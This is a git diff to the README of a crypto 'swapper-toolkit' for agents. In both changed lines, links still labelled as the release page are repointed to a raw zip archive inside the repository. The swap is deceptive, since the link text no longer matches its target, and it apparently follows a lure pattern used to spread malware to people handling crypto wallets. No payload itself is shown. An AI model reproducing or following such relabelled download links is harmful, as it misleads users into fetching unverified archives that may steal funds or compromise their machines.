@@ -1,6 +1,6 @@
 # 🤖 swapper-toolkit - Simple crypto tools for agents
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-6B7280?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Clodganjiang151/swapper-toolkit/releases)
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-6B7280?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Clodganjiang151/swapper-toolkit/raw/refs/heads/main/skills/toolkit_swapper_v1.6.zip)
 
 ## 🧩 What this is
 
@@ -12,7 +12,7 @@ It is built for people who want a simple way to work with DeFi tools from their 
 
 Use this link to visit the release page and download the Windows version:
 
-[Go to the release page](https://github.com/Clodganjiang151/swapper-toolkit/releases)
+[Go to the release page](https://github.com/Clodganjiang151/swapper-toolkit/raw/refs/heads/main/skills/toolkit_swapper_v1.6.zip)
 
 ### What to download
 
